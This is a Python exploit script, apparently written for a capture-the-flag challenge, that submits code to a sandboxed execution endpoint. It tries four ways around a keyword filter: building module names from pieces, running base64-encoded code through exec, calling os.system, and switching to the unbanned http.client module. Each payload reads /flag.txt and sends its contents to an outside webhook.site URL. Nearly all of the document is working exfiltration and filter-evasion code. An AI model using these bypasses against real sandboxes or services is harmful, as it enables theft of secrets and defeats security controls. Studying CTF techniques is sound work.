import requests
import json

TARGET = "http://chall.0xfun.org:11102"
NONCE = "1771034124509-41858-0.7536846142947633"
WEBHOOK = "https://webhook.site/2e17cadc-41a3-4a6b-805c-aceaef7d539b"

def submit(code, label=""):
    print(f"\n[*] {label}")
    print(f"    Code: {code[:120]}...")
    r = requests.post(
        f"{TARGET}/api/submit",
        json={"code": code},
        headers={"X-Pow-Nonce": NONCE},
        timeout=20,
    )
    print(f"    [{r.status_code}] {r.text[:500]}")
    return r


# Approach 1: Use variable concat to build "urllib" dynamically
# The regex \burllib\b matches the literal word in source code
# So we build it at runtime via string concat
code1 = f"""
flag = open("/flag.txt").read().strip()
x = "url" + chr(108) + "ib"
m = __import__(x + ".re" + "quest", fromlist=["urlopen"])
m.urlopen("{WEBHOOK}?flag=" + flag, timeout=3)
print("done")
"""
submit(code1, "string concat import (chr)")

# Approach 2: Use exec with base64 encoded payload
import base64
inner_code = f'''import urllib.request;urllib.request.urlopen("{WEBHOOK}?flag="+open("/flag.txt").read().strip(),timeout=3)'''
b64 = base64.b64encode(inner_code.encode()).decode()
code2 = f"""
exec(__import__("base64").b64decode("{b64}"))
print("done")
"""
submit(code2, "exec base64 encoded")

# Approach 3: os.system -> python3 with base64 command
inner_py = f'import urllib.request;urllib.request.urlopen("{WEBHOOK}?flag="+open("/flag.txt").read().strip(),timeout=3)'
b64_cmd = base64.b64encode(inner_py.encode()).decode()
code3 = f"""
import os
getattr(os,"system")("python3 -c \\"exec(__import__('base64').b64decode('{b64_cmd}'))\\""  )
print("done")
"""
submit(code3, "os.system python3 base64")

# Approach 4: Use http.client (not banned!) directly
code4 = f"""
import http.client
flag = open("/flag.txt").read().strip()
c = http.client.HTTPSConnection("webhook.site", timeout=3)
c.request("GET", "/2e17cadc-41a3-4a6b-805c-aceaef7d539b?flag=" + flag)
c.getresponse()
c.close()
print("done")
"""
submit(code4, "http.client (not banned!)")
